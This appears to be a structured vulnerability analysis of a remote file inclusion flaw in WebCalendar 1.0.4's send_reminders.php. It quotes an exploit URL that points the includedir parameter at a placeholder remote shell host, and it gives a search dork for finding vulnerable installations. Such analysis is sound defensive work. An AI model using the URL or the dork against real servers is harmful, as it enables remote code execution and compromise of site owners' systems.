Based on the provided content, here's a breakdown of the vulnerability:

**Root Cause of Vulnerability:**

*   The vulnerability is a Remote File Inclusion (RFI) flaw. This means the application allows an attacker to include a remote file, leading to arbitrary code execution.
*   The vulnerability stems from the `includedir` parameter in the `send_reminders.php` script, which does not properly sanitize user input.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The application is vulnerable to RFI due to the lack of input sanitization on the `includedir` parameter.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** Successful exploitation of this vulnerability can allow an attacker to execute arbitrary code on the server by including a malicious script from a remote location. This can lead to a full system compromise, data theft, or denial of service.

**Attack Vectors:**

*   The attack vector is through a crafted HTTP GET request to the `send_reminders.php` script, where the attacker specifies a malicious URL in the `includedir` parameter.
    *   Specifically, the provided exploit uses the URL: `http://localhost/patch/tools/send_reminders.php?noSet=0&includedir=http://sheLLz?`

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs network access to the vulnerable server hosting the WebCalendar application.
*   **Knowledge of the vulnerable script:** The attacker needs to know the vulnerable script path (`send_reminders.php`) and parameter name (`includedir`).
*   **Hosting of malicious file:** The attacker must host a malicious script on a server accessible to the target application.

**Additional Notes:**

*   The content provides a specific example of how the vulnerability can be exploited by using a crafted URL with the `includedir` parameter pointing to a malicious resource.
*   The content also provides a Google Dork to identify potentially vulnerable installations: `"WebCalendar v1.0.4"`.
*   The vulnerability is identified in WebCalendar version 1.0.4.
